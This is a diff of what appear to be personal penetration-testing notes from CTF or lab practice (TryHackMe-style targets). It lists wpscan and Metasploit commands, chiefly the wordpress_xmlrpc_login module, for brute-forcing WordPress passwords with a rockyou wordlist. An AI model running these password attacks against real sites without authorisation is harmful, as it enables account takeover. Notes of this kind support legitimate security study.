@@ -17,7 +17,33 @@ wpscan --url http://192.168.1.100/wordp/ -U users.txt –P  /usr/…./rockyou.tx
 -U  # can be one user also
 
 
+
+
+
 # Wordpress Using Metaspoilt
+
+
+# best for bruteforce  
+
+auxiliary/scanner/http/wordpress_xmlrpc_login
+
+msf> set RHOSTS 192.168.56.105
+
+msf > set TARGETURI http://deathnote.vuln/wordpress/
+
+msf> set PASS_FILE /home/suhib/tryhackme/rockyouupdated.txt
+
+msf > set USERNAME kira
+
+msf > run
+
+
+
+
+
+
+
+
 
 msf > use auxiliary/scanner/http/wordpress_login_enum
 msf auxiliary(wordpress_login_enum) > set rhosts 192.168.1.100
